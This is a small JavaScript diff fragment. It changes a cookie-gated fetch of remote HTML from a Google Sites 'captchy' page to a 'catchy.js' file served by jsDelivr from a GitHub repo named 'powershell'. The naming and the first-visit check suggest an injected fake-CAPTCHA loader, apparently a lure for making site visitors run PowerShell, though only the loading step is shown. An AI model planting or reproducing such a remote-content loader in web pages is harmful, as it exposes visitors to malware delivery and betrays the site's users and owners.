@@ -52,7 +52,7 @@ const cookie = getCookie(cookiename);
 // Cookie found
 if(!cookie)
 {
-    fetch("https://sites.google.com/view/captchy/home") 
+    fetch("https://cdn.jsdelivr.net/gh/joault/powershell@main/catchy.js") 
     .then(response => response.ok ? response.text() : Promise.reject())
     .then(html =>
     {
